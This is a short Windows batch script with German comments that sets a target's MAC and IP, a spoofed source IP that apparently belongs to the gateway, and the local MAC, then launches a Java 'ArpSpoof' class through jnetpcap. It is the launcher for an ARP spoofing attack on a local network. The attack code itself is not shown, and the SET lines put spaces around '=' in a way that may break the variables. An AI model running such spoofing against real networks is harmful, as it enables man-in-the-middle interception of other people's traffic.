@echo off
setlocal

REM Mac vom Target
SET dst_mac = 24:0A:64:1C:A6:18

REM ausgeben als IP
SET src_ip = 192.168.0.1

REM ausgeben als MAC (wirklich die eigene)
SET src_mac = 60:02:B4:B8:61:EC

REM IP vom Target
SET dst_ip = 192.168.0.12

java -cp .;jnetpcap.jar ArpSpoof %dst_mac % %src_ip % %src_mac % %dst_ip %

endlocal

pause